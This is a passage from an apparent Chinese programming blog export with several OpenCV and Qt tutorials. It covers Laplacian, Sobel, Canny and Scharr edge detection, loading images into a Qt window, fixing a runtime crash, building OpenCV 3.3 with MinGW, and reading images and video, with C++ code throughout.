//将图像转化为灰度图 cv::Mat img_gray&#123;&#125;; cv::cvtColor(img, img_gray, cv::COLOR_RGB2GRAY); //使用高斯滤波 cv::GaussianBlur(img_gray, img_gray, cv::Size(3, 3), 0, 0, cv::BORDER_DEFAULT); //使用Laplacian cv::Mat abs_dst&#123;&#125;; int kernel_size = 3; int scale = 1; int delta = 0; int ddepth = CV_16S; cv::Laplacian(img_gray, img, ddepth, kernel_size, scale, delta, cv::BORDER_DEFAULT); //计算绝对值，并将结果转换成8位 cv::convertScaleAbs(img, abs_dst); // 在窗口中显示avatar cv::imshow(\"Laplacian+高斯滤波\", abs_dst); // 等待按下任意键后窗口关闭 cv::waitKey(0);&#125; 结果是这样的 结果上可以看出的是，细节部分损失的很严重，看来要用其他方法。 使用SobelSobel算法是整像素图像边缘检测中最重要的算子之一，在机器学习、数字媒体、计算机视觉等信息科技领域起着举足轻重的作用。在技术上，它是一个离散的一阶差分算子，用来计算图像亮度函数的一阶梯度之近似值。在图像的任何一点使用此算子，将会产生该点对应的梯度矢量或是其法矢量。 我们假设原始图像叫做A，然后我们分别对x和y方向求导。注意的是在计算机中我们是没有办法求导数的，只可以采用近似的方法。这里是使用了卷积核Gx和Gy $G_x= \\left| \\begin{array} (-1 &amp; 0 &amp; +1 \\-2 &amp; 0 &amp; +2 \\-1 &amp; 0 &amp; +1 \\end{array} \\right | *A$ $G_y= \\left| \\begin{array} (-1 &amp; -2 &amp; -1 \\0 &amp; 0 &amp; 0 \\+1 &amp; +2 &amp; +1 \\end{array} \\right | *A$ 在通过以下公式计算出梯度 $G=\\sqrt{G_x^2+G_y^2}$ 可用以下公式计算梯度方向 $\\theta=\\arctan(\\frac{G_y}{G_x})$ 在上面例子中，如果以上的角度Θ等于零，即代表图像该处拥有纵向边缘，左方比右方暗。Sobel算子结合了高斯平滑和分化，结果会更具鲁棒性。 函数原型 1234CV_EXPORTS_W void Sobel( InputArray src, OutputArray dst, int ddepth, int dx, int dy, int ksize = 3, double scale = 1, double delta = 0, int borderType = BORDER_DEFAULT ); 源代码中参数定义 1234@param src input image.@param dst output image of the same size and the same number of channels as src .@param ddepth output image depth, see @ref filter_depths &quot;combinations&quot;; in the case of8-bit input images it will result in truncated derivatives. 这里支持的组合有 若src.depth() = CV_8U, 取ddepth =-1/CV_16S/CV_32F/CV_64F 若src.depth() = CV_16U/CV_16S, 取ddepth =-1/CV_32F/CV_64F 若src.depth() = CV_32F, 取ddepth =-1/CV_32F/CV_64F 若src.depth() = CV_64F, 取ddepth = -1/CV_64F 123456@param dx order of the derivative x.@param dy order of the derivative y.@param ksize size of the extended Sobel kernel; it must be 1, 3, 5, or 7.@param scale optional scale factor for the computed derivative values; by default, no scaling is applied (see cv::getDerivKernels for details).@param delta optional delta value that is added to the results prior to storing them in dst.@param borderType pixel extrapolation method, see cv::BorderTypes 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940/********************************************************程序名称：Sobel*开发环境：vs2015+opencv3.3*2017.10.24 by coordinate*www.coordinate.wang*CSDN:coordinate_blog*********************************************************/#include &lt;iostream&gt; #include &lt;opencv2\\opencv.hpp&gt;int main() &#123; //读取图像 cv::Mat img = cv::imread(\"avatar.png\"); if (!img.data) &#123; std::cout &lt;&lt; \"Error: read image\" &lt;&lt; std::endl; return -1; &#125; //将图像转化为灰度图 cv::Mat img_gray&#123;&#125;; cv::cvtColor(img, img_gray, cv::COLOR_RGB2GRAY); //使用高斯滤波 cv::GaussianBlur(img_gray, img_gray, cv::Size(3, 3), 0, 0, cv::BORDER_DEFAULT); //创建 grad_x 和 grad_y 矩阵 cv::Mat grad_x&#123;&#125;, grad_y&#123;&#125;; cv::Mat abs_grad_x&#123;&#125;, abs_grad_y&#123;&#125;, dst&#123;&#125;; //求 X方向梯度 cv::Sobel(img_gray, grad_x, CV_16S, 1, 0, 3, 1, 1, cv::BORDER_DEFAULT); cv::convertScaleAbs(grad_x, abs_grad_x); //求Y方向梯度 cv::Sobel(img_gray, grad_y, CV_16S, 0, 1, 3, 1, 1, cv::BORDER_DEFAULT); convertScaleAbs(grad_y, abs_grad_y); //合并梯度(近似) cv::addWeighted(abs_grad_x, 0.5, abs_grad_y, 0.5, 0, dst); cv::imshow(\"整体方向Sobel\", dst); // 等待按下任意键后窗口关闭 cv::waitKey(0);&#125; 结果如下： 我觉得使用Sobel虽然没有使用Canny后的图片效果棱角分明，但它更加的自然。 使用canny算子Canny边缘检测算子是John F.Canny于 1986 年开发出来的一个多级边缘检测算法。更为重要的是 Canny 创立了边缘检测计算理论（Computational theory ofedge detection）解释这项技术如何工作。 Canny 的目标是找到一个最优的边缘检测算法，最优边缘检测的含义是： 好的检测- 算法能够尽可能多地标识出图像中的实际边缘。 好的定位- 标识出的边缘要尽可能与实际图像中的实际边缘尽可能接近。 最小响应- 图像中的边缘只能标识一次，并且可能存在的图像噪声不应标识为边缘。 主要步骤 消除噪声-使用高斯滤波 计算梯度的幅值和方向-使用Sobel算子 对梯度幅值进行非极大值抑制 用双阈值算法检测和连接边缘 函数原型 123CV_EXPORTS_W void Canny( InputArray image, OutputArray edges, double threshold1, double threshold2, int apertureSize = 3, bool L2gradient = false ); 源代码参数说明 123456@param image 8-bit input image.@param edges output edge map; single channels 8-bit image, which has the same size as image .@param threshold1 first threshold for the hysteresis procedure.@param threshold2 second threshold for the hysteresis procedure.@param apertureSize aperture size for the Sobel operator.@param L2gradient a flag, indicating whether a more accurate 代码如下： 12345678910111213141516171819202122232425262728293031323334/********************************************************程序名称：Canny*开发环境：vs2015+opencv3.3*2017.10.24 by coordinate*www.coordinate.wang*CSDN:coordinate_blog*********************************************************/#include &lt;iostream&gt; #include &lt;opencv2\\opencv.hpp&gt;int main() &#123; //读取图像 cv::Mat img = cv::imread(\"avatar.png\"); if (!img.data) &#123; std::cout &lt;&lt; \"Error: read image\" &lt;&lt; std::endl; return -1; &#125; //将图像转化为灰度图 cv::Mat img_gray&#123;&#125;; cv::cvtColor(img, img_gray, cv::COLOR_RGB2GRAY); //使用高斯滤波 cv::GaussianBlur(img_gray, img_gray, cv::Size(3, 3), 0, 0, cv::BORDER_DEFAULT); //使用canny算子 double threshold1 = 120.0; double threshold2 = 55.0; int apertureSize = 3; cv::Canny(img_gray, img_gray, threshold1, threshold2, apertureSize); // 在窗口中显示avatar cv::imshow(\"Canny\", img_gray); // 等待按下任意键后窗口关闭 cv::waitKey(0);&#125; 参数threshold1主要调节的是外轮廓，参数threshold2主要调节的是内轮廓，我这里经过多次测试后选择这个参数threshold1=120 threshold2=55，最后的结果是 效果比Laplacian好太多了。 Scharr滤波器Scharr与之前的Sobel类似，只是他们的卷积核不同。它的卷积核分别是 $G_x= \\left| \\begin{array} (-3 &amp; 0 &amp; +3 \\-10 &amp; 0 &amp; +10 \\-3 &amp; 0 &amp; +3 \\end{array} \\right | *A$ $G_y= \\left| \\begin{array} (-3 &amp; -10 &amp; -3 \\0 &amp; 0 &amp; 0 \\+3 &amp; +10 &amp; +3 \\end{array} \\right | *A$ 其实我们可以很快的知道，这两者算法的效率是一样的。但是这个卷积核得到的结果比Sobel更精确。 函数原型 123CV_EXPORTS_W void Scharr( InputArray src, OutputArray dst, int ddepth, int dx, int dy, double scale = 1, double delta = 0, int borderType = BORDER_DEFAULT ); 源代码中参数的定义 12345678@param src input image.@param dst output image of the same size and the same number of channels as src.@param ddepth output image depth, see @ref filter_depths &quot;combinations&quot;@param dx order of the derivative x.@param dy order of the derivative y.@param scale optional scale factor for the computed derivative values; by default, no scaling is applied (see getDerivKernels for details).@param delta optional delta value that is added to the results prior to storing them in dst.@param borderType pixel extrapolation method, see cv::BorderTypes 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041/********************************************************程序名称：scharr*开发环境：vs2015+opencv3.3*2017.10.24 by coordinate*www.coordinate.wang*CSDN:coordinate_blog*********************************************************/#include &lt;iostream&gt; #include &lt;opencv2\\opencv.hpp&gt;int main() &#123; //读取图像 cv::Mat img = cv::imread(\"avatar.png\"); if (!img.data) &#123; std::cout &lt;&lt; \"Error: read image\" &lt;&lt; std::endl; return -1; &#125; //将图像转化为灰度图 cv::Mat img_gray&#123;&#125;; cv::cvtColor(img, img_gray, cv::COLOR_RGB2GRAY); //使用高斯滤波 cv::GaussianBlur(img_gray, img_gray, cv::Size(3, 3), 0, 0, cv::BORDER_DEFAULT); //创建 grad_x 和 grad_y 矩阵 cv::Mat grad_x&#123;&#125;, grad_y&#123;&#125;; cv::Mat abs_grad_x&#123;&#125;, abs_grad_y&#123;&#125;, dst&#123;&#125;; //求 X方向梯度 cv::Scharr(img_gray, grad_x, CV_16S, 1, 0, 1, 0, cv::BORDER_DEFAULT); cv::convertScaleAbs(grad_x, abs_grad_x); //求Y方向梯度 cv::Scharr(img_gray, grad_y, CV_16S, 0, 1, 1, 0, cv::BORDER_DEFAULT); cv::convertScaleAbs(grad_y, abs_grad_y); //合并梯度(近似) cv::addWeighted(abs_grad_x, 0.5, abs_grad_y, 0.5, 0, dst); //显示效果图 imshow(\"合并梯度后Scharr\", dst); // 等待按下任意键后窗口关闭 cv::waitKey(0);&#125; 最后的结果为 相较于之前的Sobel，这次的图像在细节上面更加的好了。 最后的整合最后我把我做的工作，结合到了我开发的一个小程序中。 小程序的教程在整理中^_^!!!","categories":[{"name":"图像处理","slug":"图像处理","permalink":"http://coordinate.wang/categories/图像处理/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"},{"name":"qt","slug":"qt","permalink":"http://coordinate.wang/tags/qt/"}]},{"title":"QT5.9.1与opencv3.3读取图片","slug":"2017-10-21-QT5.9.1与opencv3.3读取图片","date":"2017-10-20T16:00:00.000Z","updated":"2018-02-18T03:29:07.353Z","comments":true,"path":"2017/10/21/2017-10-21-QT5.9.1与opencv3.3读取图片/","link":"","permalink":"http://coordinate.wang/2017/10/21/2017-10-21-QT5.9.1与opencv3.3读取图片/","excerpt":"","text":"首先我们要新建一个项目，选择Qt Widgets Application 一直点击下一步，直到出现下面这个窗口（项目名称自己填写一个） 注意这里的基类我们要选择QMianWindow，因为我们要做一个带有菜单的界面。接着点击下一步完成即可。 点击pro文件，添加opencv的路径，以及我们所需的相关库文件，例如 1234INCLUDEPATH += F:\\opencv\\opencv3\\QT_opencv\\include\\opencv \\ F:\\opencv\\opencv3\\QT_opencv\\include\\opencv2 \\ F:\\opencv\\opencv3\\QT_opencv\\includeLIBS += -L F:\\opencv\\opencv3\\QT_opencv\\x86\\mingw\\lib\\libopencv_*.a 按照我这篇文章里面讲的方法，将相应的dll文件copy到工程目录中去（如果不这样做会出现crashed问题）。 然后双击mianwindow.ui，接下来我们设计图形界面。 双击在这里输入，我这里输入文件(F)，然后点击我们创建好的文件(F) 我们接着在创建一个a，因为我们这里无法输入汉字，所以先输入一个字母代替。 接着选中这个a，在下面的菜单栏中修改名称为actionOpenFile，双击快捷键出现编辑动作选项，我们选中shortcut然后按下ctrl+f组合键，即可创建快捷键。如图 然后右击，选择转到槽，QAction选择triggered，生成对应的槽函数。再回到ui界面。 从左边的菜单栏中的Display Widgets中选择出label，将它拖到主界面中。 双击label，删除里面的文字信息。调整label的大小，使它和整个界面大小一致。最后的界面是这样的 ui界面就搞定了，接下来解决槽函数的编写。 我们这里使用QImage存储图片对象，而opencv中使用的是Mat数据结构，所以我们要做一些转换操作。使用cvtColor函数将Mat的BGR顺序转换为QImage的RGB顺序。 要添加如下头文件 12345#include &lt;QMessageBox&gt;#include &lt;opencv.hpp&gt;#include &lt;QImage&gt;#include &lt;QFileDialog&gt;#include &lt;QFile&gt; 槽函数为 12345678910111213141516171819202122232425262728293031void MainWindow::on_actionOpenFile_triggered()&#123; //打开文件选择框 QString path = QFileDialog::getOpenFileName(this, tr(\"open\"), tr(\"../\")); if(!path.isEmpty()) &#123; //读取一幅图片，这里我们要将QString转换为String使用toStdString函数 cv::Mat image = cv::imread(path.toStdString()); if(!image.data) &#123; QMessageBox::warning(this, tr(\"警告\"),tr(\"图片打开失败\")); return; &#125; else &#123; //改变彩色通道顺序 cv::cvtColor(image, image, CV_RGB2BGR); //初始化QImage对象 QImage img = QImage((const unsigned char*)(image.data), image.cols, image.rows, QImage::Format_RGB888); //显示在label中 ui-&gt;label-&gt;setPixmap(QPixmap::fromImage(img)); //改变label的大小用于自适应图像大小 ui-&gt;label-&gt;resize(ui-&gt;label-&gt;pixmap()-&gt;size()); &#125; &#125; else &#123; QMessageBox::warning(this, tr(\"警告\"),tr(\"请选择文件\")); return; &#125;&#125; 最后的效果图 至此我们实现了一个简单的图片读取功能^_^，下一讲我会对这个功能进行一些优化。","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"},{"name":"qt","slug":"qt","permalink":"http://coordinate.wang/tags/qt/"}]},{"title":"QT5.9.1和opencv3.3运行时crashed的问题解决","slug":"2017-10-20-QT5.9.1和opencv3.3运行时crashed的问题解决","date":"2017-10-19T16:00:00.000Z","updated":"2018-02-18T03:29:07.338Z","comments":true,"path":"2017/10/20/2017-10-20-QT5.9.1和opencv3.3运行时crashed的问题解决/","link":"","permalink":"http://coordinate.wang/2017/10/20/2017-10-20-QT5.9.1和opencv3.3运行时crashed的问题解决/","excerpt":"","text":"首先我现在的pro文件是在之前的pro文件添加了以下内容： 1234INCLUDEPATH += F:\\opencv\\opencv3\\QT_opencv\\include\\opencv \\ F:\\opencv\\opencv3\\QT_opencv\\include\\opencv2 \\ F:\\opencv\\opencv3\\QT_opencv\\includeLIBS += -L F:\\opencv\\opencv3\\QT_opencv\\x86\\mingw\\lib\\libopencv_*.a 请注意这里的的文件夹位置信息，请参考我之前的配置方法 这是我的应用输出 123Starting D:\\qt\\build-CVS-Desktop_Qt_5_9_1_MinGW_32bit-Debug\\debug\\CVS.exe...程序异常结束。D:\\qt\\build-CVS-Desktop_Qt_5_9_1_MinGW_32bit-Debug\\debug\\CVS.exe crashed. Debug模式下会出现这样的问题During startup program exited with code 0x0000135 如果你也是碰到了这样的问题的话，那么恭喜你，接下来的解决方法你也可以使用。 在我们建立的文件夹下找到F:\\opencv\\opencv3\\QT_opencv\\x86\\mingw\\bin 将文件夹中的所有dll文件copy到QT编译生成的文件夹中D:\\qt\\build-CVS-Desktop_Qt_5_9_1_MinGW_32bit-Debug\\debug这里要注意的是debug和release模式不要搞混。如图 再次运行就不会出现问题了。^_^!!!","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"},{"name":"qt","slug":"qt","permalink":"http://coordinate.wang/tags/qt/"}]},{"title":"QT5.9.1和opencv3.3配置(win10)","slug":"2017-10-18-QT5.9.1+opencv3.3配置","date":"2017-10-17T16:00:00.000Z","updated":"2018-02-18T03:29:07.338Z","comments":true,"path":"2017/10/18/2017-10-18-QT5.9.1+opencv3.3配置/","link":"","permalink":"http://coordinate.wang/2017/10/18/2017-10-18-QT5.9.1+opencv3.3配置/","excerpt":"","text":"环境配置首先你要安装好CMake、QT、opencv，并且配置好相应的环境变量 接着我们要对opencv进行编译，我这里使用QT自带的MinGW。这里要注意的是，如果之前有安装过MinGW，并且配置过相应的环境变量的话，记得要把环境变量里面的值删除，否则会与QT自带的MinGW冲突。 这个是我安装opencv的位置 然后在where is the source code 和 where to bulid the binaries中分别添加opencv的路径和要编译的位置，这里我的编译文件夹设置为QT_bulid 下面这一步很关键，点击configure，然后选择默认选项Use default native compliers，如果这里出现了错误，请仔细检查环境变量中是否有其他的MinGW。 然后将WITH_QT和WITH_OPENGL选上，将OPENCV_EXTRA_MODULES_PATH设置，我这里设为F:\\opencv\\opencv3\\opencv-3.3.0\\modules再，根据你的opencv解压路径变化，再次Configure。 接着会报一系列错误 将上图中的红色部分的Value变为 123456F:\\qt5.9\\5.9.1\\mingw53_32\\bin\\qmake.exeF:\\qt5.9\\5.9.1\\mingw53_32\\lib\\cmake\\Qt5ConcurrentF:\\qt5.9\\5.9.1\\mingw53_32\\lib\\cmake\\Qt5CoreF:\\qt5.9\\5.9.1\\mingw53_32\\lib\\cmake\\Qt5GuiF:\\qt5.9\\5.9.1\\mingw53_32\\lib\\cmake\\Qt5TestF:\\qt5.9\\5.9.1\\mingw53_32\\lib\\cmake\\Qt5Widgets 然后又再次报错，道路总是这么的曲折！^_^这次的问题出在了Qt5OpenGL_DIR（当然可能会有别的红色部分，我们只关心gl相关的错误） 将他设置为F:\\qt5.9\\5.9.1\\mingw53_32\\lib\\cmake\\Qt5OpenGL，最后所有都设置好后，如下图（当然你可能和我的图不一样，不用担心，只要设置好就ok） 注意到这里，我们要记得将之前设置的OPENCV_EXTRA_MODULES_PATH置为空，也就是开始时什么都没有的状态，否则会出问题。另外在F:\\opencv\\opencv3\\opencv-3.3.0\\cmake文件夹下找到OpenCVCompilerOptions.cmake文件，将add_extra_compiler_option(-Werror=non-virtual-dtor)前面加一个#，再次Configure。 这次没出现问题了，谢天谢地！！！点击Generate 在我们之前设置的文件夹QT_bulid中，建立这样一个批处理文件run.bat，内容如下 12mingw32-makemingw32-make install 双击批处理即可。 在编译过程中会出现这样的一个问题，果然是命途多舛，哎！！！ 1windres.exe: unknown option -- W 问题的原因出在cmake的版本，如果使用的是3.8就没有问题，别的版本就不清楚了，我使用的是3.10版本，爆了这样的错误。 不幸的是，你要按照之前的步骤重新来过，再来过之前，先把原来的相关文件夹清空，避免再次出现一些不相关的问题。 又回到了那个熟悉的界面，我发誓我真的不想再见到它了！！！将ENABLE_PRECOMPILED_HEADERS的钩去掉。再次configure，ok没报错，接着generate。 通过之前写的批处理，此时你应该把它删除了，所以再次建立一个批处理，双击它。 不过居然又报错了，呵呵！！！ 123456modules\\videoio\\CMakeFiles\\opencv_videoio.dir\\build.make:187: recipe for target &apos;modules/videoio/CMakeFiles/opencv_videoio.dir/src/cap_dshow.cpp.obj&apos; failedmingw32-make[2]: *** [modules/videoio/CMakeFiles/opencv_videoio.dir/src/cap_dshow.cpp.obj] Error 1CMakeFiles\\Makefile2:2912: recipe for target &apos;modules/videoio/CMakeFiles/opencv_videoio.dir/all&apos; failedmingw32-make[1]: *** [modules/videoio/CMakeFiles/opencv_videoio.dir/all] Error 2Makefile:161: recipe for target &apos;all&apos; failedmingw32-make: *** [all] Error 2 在F:\\opencv\\opencv3\\opencv-3.3.0\\modules\\videoio\\src文件夹中的cap_dshow.cpp中添加 1#define STRSAFE_NO_DEPRECATE 然后再按上面的步骤重新来一遍，我呵呵了！！！记得不要漏了步骤，否则你懂的！！！！ 我的笔记本配置比较老是i7-4910的cpu，所以花费了很长的时间编译，不过让我感到欣慰的是，总算配置好了。^_^!!! 最后一步就是新建一个文件夹，例如F:\\opencv\\opencv3\\QT_opencv，将opencv的安装文件夹F:\\opencv\\opencv3\\opencv-3.3.0下的include文件夹copy过来，再将之前建立的目录F:\\opencv\\opencv3\\QT_bulid下的bin和lib文件夹copy过来。最后将F:\\opencv\\opencv3\\QT_bulid\\bin添加到环境变量。将之前install opencv的目录下的所有文件copy过来，注意这里的install opencv目录是指后来编译安装目录，不是之前的opencv目录，我这里是F:\\opencv\\opencv3\\QT_bulid\\install。 ok，所有工作完成。 最后为了节省大家的时间，我把编译后的opencv3.3传到了CSDN上，由于上传大小限制，所以分成了两个文件，我真的不是为了骗积分（好吧，其实有一点╮(╯-╰)╭）！opencv3.3编译文件opencv3.3编译文件2 下一节正式开始我们的编程之旅^_^！！","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"},{"name":"qt","slug":"qt","permalink":"http://coordinate.wang/tags/qt/"}]},{"title":"opencv读取图片和视屏","slug":"2017-10-17-opencv读取图片和视屏","date":"2017-10-16T16:00:00.000Z","updated":"2018-02-18T03:29:07.338Z","comments":true,"path":"2017/10/17/2017-10-17-opencv读取图片和视屏/","link":"","permalink":"http://coordinate.wang/2017/10/17/2017-10-17-opencv读取图片和视屏/","excerpt":"","text":"显示一幅图片我们首先将图片文件用imread读取然后存储到Mat类的对象中。 12345678910#include &lt;iostream&gt; #include &lt;opencv2\\opencv.hpp&gt;using namespace cv;int main() &#123; Mat img = imread(\"avatar.jpg\"); // 在窗口中显示avatar imshow(\"avatar\", img); // 等待按下任意键 waitKey(0);&#125; Mat类是用于保存图像以及其他矩阵数据的数据结构，默认情况下大小为0.我么可以为其设置初始值，例如 1Mat picture(320, 640, Scalar(100)); imread函数关于imread函数，函数原型如下： 1Mat imread(const string&amp; filename, int flag = 1); 它的第一个参数filename，填入我们需要读取图片的路径。在windows下支持如下类型的加载： Windows bitmaps - .bmp, .dib (always supported) JPEG files - .jpeg, .jpg, .jpe (see the Notes* section) JPEG 2000 files - .jp2 (see the Notes* section) Portable Network Graphics - .png (see the Notes* section) WebP - .webp (see the Notes* section) Portable image format - .pbm, .pgm, .ppm .pxm, *.pnm (always supported) Sun rasters - .sr, .ras (always supported) TIFF files - .tiff, .tif (see the Notes section) OpenEXR Image files - .exr (see the Notes* section) Radiance HDR - .hdr, .pic (always supported) Raster and Vector geospatial data supported by Gdal (see the Notes section) 第二个参数flag的设置，我们通过查看imgcodecs.hpp（opencv3.3）可以知道如下的枚举变量，默认情况下设置为1（IMREAD_COLOR）。 123456789101112131415enum ImreadModes &#123; IMREAD_UNCHANGED = -1, //!&lt; If set, return the loaded image as is (with alpha channel, otherwise it gets cropped). IMREAD_GRAYSCALE = 0, //!&lt; If set, always convert image to the single channel grayscale image. IMREAD_COLOR = 1, //!&lt; If set, always convert image to the 3 channel BGR color image. IMREAD_ANYDEPTH = 2, //!&lt; If set, return 16-bit/32-bit image when the input has the corresponding depth, otherwise convert it to 8-bit. IMREAD_ANYCOLOR = 4, //!&lt; If set, the image is read in any possible color format. IMREAD_LOAD_GDAL = 8, //!&lt; If set, use the gdal driver for loading the image. IMREAD_REDUCED_GRAYSCALE_2 = 16, //!&lt; If set, always convert image to the single channel grayscale image and the image size reduced 1/2. IMREAD_REDUCED_COLOR_2 = 17, //!&lt; If set, always convert image to the 3 channel BGR color image and the image size reduced 1/2. IMREAD_REDUCED_GRAYSCALE_4 = 32, //!&lt; If set, always convert image to the single channel grayscale image and the image size reduced 1/4. IMREAD_REDUCED_COLOR_4 = 33, //!&lt; If set, always convert image to the 3 channel BGR color image and the image size reduced 1/4. IMREAD_REDUCED_GRAYSCALE_8 = 64, //!&lt; If set, always convert image to the single channel grayscale image and the image size reduced 1/8. IMREAD_REDUCED_COLOR_8 = 65, //!&lt; If set, always convert image to the 3 channel BGR color image and the image size reduced 1/8. IMREAD_IGNORE_ORIENTATION = 128 //!&lt; If set, do not rotate the image according to EXIF's orientation flag. &#125;; imshow函数函数原型为： 1void imshow(const string&amp; winname, InputArray mat); 函数第一个参数代表的是显示窗口的标题名。函数第二个参数表示要输入的Mat数据对象，但是这里的类型时InputArray。 查看InputArray的定义 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103typedef const _InputArray&amp; InputArray;class CV_EXPORTS _InputArray&#123;public: enum &#123; KIND_SHIFT = 16, FIXED_TYPE = 0x8000 &lt;&lt; KIND_SHIFT, FIXED_SIZE = 0x4000 &lt;&lt; KIND_SHIFT, KIND_MASK = 31 &lt;&lt; KIND_SHIFT, NONE = 0 &lt;&lt; KIND_SHIFT, MAT = 1 &lt;&lt; KIND_SHIFT, MATX = 2 &lt;&lt; KIND_SHIFT, STD_VECTOR = 3 &lt;&lt; KIND_SHIFT, STD_VECTOR_VECTOR = 4 &lt;&lt; KIND_SHIFT, STD_VECTOR_MAT = 5 &lt;&lt; KIND_SHIFT, EXPR = 6 &lt;&lt; KIND_SHIFT, OPENGL_BUFFER = 7 &lt;&lt; KIND_SHIFT, CUDA_HOST_MEM = 8 &lt;&lt; KIND_SHIFT, CUDA_GPU_MAT = 9 &lt;&lt; KIND_SHIFT, UMAT =10 &lt;&lt; KIND_SHIFT, STD_VECTOR_UMAT =11 &lt;&lt; KIND_SHIFT, STD_BOOL_VECTOR =12 &lt;&lt; KIND_SHIFT, STD_VECTOR_CUDA_GPU_MAT = 13 &lt;&lt; KIND_SHIFT, STD_ARRAY =14 &lt;&lt; KIND_SHIFT, STD_ARRAY_MAT =15 &lt;&lt; KIND_SHIFT &#125;; _InputArray(); _InputArray(int _flags, void* _obj); _InputArray(const Mat&amp; m); _InputArray(const MatExpr&amp; expr); _InputArray(const std::vector&lt;Mat&gt;&amp; vec); template&lt;typename _Tp&gt; _InputArray(const Mat_&lt;_Tp&gt;&amp; m); template&lt;typename _Tp&gt; _InputArray(const std::vector&lt;_Tp&gt;&amp; vec); _InputArray(const std::vector&lt;bool&gt;&amp; vec); template&lt;typename _Tp&gt; _InputArray(const std::vector&lt;std::vector&lt;_Tp&gt; &gt;&amp; vec); _InputArray(const std::vector&lt;std::vector&lt;bool&gt; &gt;&amp;); template&lt;typename _Tp&gt; _InputArray(const std::vector&lt;Mat_&lt;_Tp&gt; &gt;&amp; vec); template&lt;typename _Tp&gt; _InputArray(const _Tp* vec, int n); template&lt;typename _Tp, int m, int n&gt; _InputArray(const Matx&lt;_Tp, m, n&gt;&amp; matx); _InputArray(const double&amp; val); _InputArray(const cuda::GpuMat&amp; d_mat); _InputArray(const std::vector&lt;cuda::GpuMat&gt;&amp; d_mat_array); _InputArray(const ogl::Buffer&amp; buf); _InputArray(const cuda::HostMem&amp; cuda_mem); template&lt;typename _Tp&gt; _InputArray(const cudev::GpuMat_&lt;_Tp&gt;&amp; m); _InputArray(const UMat&amp; um); _InputArray(const std::vector&lt;UMat&gt;&amp; umv);#ifdef CV_CXX_STD_ARRAY template&lt;typename _Tp, std::size_t _Nm&gt; _InputArray(const std::array&lt;_Tp, _Nm&gt;&amp; arr); template&lt;std::size_t _Nm&gt; _InputArray(const std::array&lt;Mat, _Nm&gt;&amp; arr);#endif Mat getMat(int idx=-1) const; Mat getMat_(int idx=-1) const; UMat getUMat(int idx=-1) const; void getMatVector(std::vector&lt;Mat&gt;&amp; mv) const; void getUMatVector(std::vector&lt;UMat&gt;&amp; umv) const; void getGpuMatVector(std::vector&lt;cuda::GpuMat&gt;&amp; gpumv) const; cuda::GpuMat getGpuMat() const; ogl::Buffer getOGlBuffer() const; int getFlags() const; void* getObj() const; Size getSz() const; int kind() const; int dims(int i=-1) const; int cols(int i=-1) const; int rows(int i=-1) const; Size size(int i=-1) const; int sizend(int* sz, int i=-1) const; bool sameSize(const _InputArray&amp; arr) const; size_t total(int i=-1) const; int type(int i=-1) const; int depth(int i=-1) const; int channels(int i=-1) const; bool isContinuous(int i=-1) const; bool isSubmatrix(int i=-1) const; bool empty() const; void copyTo(const _OutputArray&amp; arr) const; void copyTo(const _OutputArray&amp; arr, const _InputArray &amp; mask) const; size_t offset(int i=-1) const; size_t step(int i=-1) const; bool isMat() const; bool isUMat() const; bool isMatVector() const; bool isUMatVector() const; bool isMatx() const; bool isVector() const; bool isGpuMatVector() const; ~_InputArray();protected: int flags; void* obj; Size sz; void init(int _flags, const void* _obj); void init(int _flags, const void* _obj, Size _sz);&#125;; 我们可以发现，其中的一个构造函数是用Mat类型进行初始化的。注意这里的一个小细节class CV_EXPORTS _InputArray，为什么会有这样的定义出现呢？查看CV_EXPORTS的定义发现 1234567#if (defined _WIN32 || defined WINCE || defined __CYGWIN__) &amp;&amp; defined CVAPI_EXPORTS# define CV_EXPORTS __declspec(dllexport)#elif defined __GNUC__ &amp;&amp; __GNUC__ &gt;= 4# define CV_EXPORTS __attribute__ ((visibility (\"default\")))#else# define CV_EXPORTS#endif 这样做的目的主要是为了适应不同编译器的需求。以上的内容纯属闲扯，看不懂无所谓，可以跳过，不过我相信有人会对这些东西感兴趣，所以就写出来，^_^！！！ ok，我们再看一下如何读取一个视屏。 显示一段视屏1234567891011121314#include &lt;iostream&gt; #include &lt;opencv2\\opencv.hpp&gt;using namespace cv;int main()&#123; VideoCapture capture(\"video.flv\"); while (1) &#123; Mat frame; //定义一个Mat变量 capture &gt;&gt; frame; //读取当前帧 imshow(\"video\", frame); //显示当前帧 waitKey(30); //延时30ms &#125;&#125; 同样非常简单的一个程序。我们先初始化一个视屏对象(VideoCapture)capture，然后在一个无限循环里面不断地读取每一帧的内容再以图片的方式显示出来。这里要注意的是，这个程序一旦启动是无法停止的。也就是你只可以通过VS2015的菜单栏上的停止按钮去停止它，通过关闭窗口的形式是无法做到的（具体原因前面已经说明了，循环中不断读取每一帧图像并显示）。 